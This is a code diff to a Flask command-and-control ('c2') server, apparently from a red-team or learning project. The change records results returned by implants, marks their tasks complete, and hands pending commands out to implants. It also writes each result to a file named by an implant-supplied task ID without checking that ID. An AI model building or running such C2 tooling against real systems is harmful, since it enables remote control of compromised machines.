@@ -1,7 +1,7 @@
 from crypt import methods
 from flask import Blueprint, jsonify, request
 from speedrun.db import db
-from speedrun.models import Implant, Task 
+from speedrun.models import Implant, Task, CREATED, TASKED, COMPLETE
 
 c2 = Blueprint('c2', __name__)
 
@@ -63,9 +63,29 @@ def handle_implant_task():
     if results:
         # TODO: update the database with the reuslts 
         print("We got results!", results)
+        ids = []
+        for r in results:
+            task_id = r.get("task_id")
+            result = r.get("result")
+            if task_id and result:
+                ids.append(task_id)
+                with open(task_id, "w+") as f:
+                    f.write(result)
+                print(f"Job result:{task_id}:{result}")
+        tasks = Task.query.filter(Task.task_id.in_(ids)).all()
+        for t in tasks:
+            t.status = COMPLETE
+        db.session.commit()
+
+        #session.query(MyUserClass).filter(MyUserClass.id.in_((123,456))).all()
+
     implant_id = data.get("implant_id")
     #Agent.query.filter_by(agent_id=id_).first()
-    tasks = list(Task.query.filter_by(implant_id = implant_id).all())
+    tasks = list(Task.query.filter_by(implant_id = implant_id, status=CREATED ).all())
+    for t in tasks:
+        t.status= TASKED
+    
+    db.session.commit()
     return jsonify(
         [{"cmd": i.cmd, "task_id": i.task_id, "args": i.args} for i in tasks]
     )
